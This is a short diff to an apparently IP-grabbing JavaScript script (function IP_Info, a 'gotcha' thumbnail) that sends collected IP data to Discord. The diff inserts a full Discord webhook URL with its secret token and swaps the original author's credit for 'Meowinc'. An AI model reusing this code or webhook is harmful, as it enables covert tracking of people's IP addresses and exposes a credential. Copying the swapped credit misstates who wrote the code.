@@ -9,7 +9,7 @@
 */
 
 
-const webhook = "your webhook url"
+const webhook = "https://discord.com/api/webhooks/1421496557810880585/4Xeks6qwNvtYsR_AeeBe8lmij13a1Uofq_IArMiwCgzXeJJA0YsNl2w9aH9HaDeACxFx"
 
 async function IP_Info(){
     /**
@@ -72,12 +72,12 @@ async function IP_Info(){
               }
               ],
               footer: {
-                text: "Programmed by Z3NTL3",
+                text: "Programmed by Meowinc",
                 icon_url: "https://avatars.githubusercontent.com/u/48758770?s=400&u=d0a4b500baea4e122b127eb91b4a80af3464f9f5&v=4"
               },
               author: {
-                name: "Pix4",
-                url: "https://code.pix4.dev"
+                name: "Meowinc",
+                url: ""
               },
               thumbnail: {
                 url: "https://media.tenor.com/h2AVqgVw4ZoAAAAC/gotcha-michael-madsen.gif"
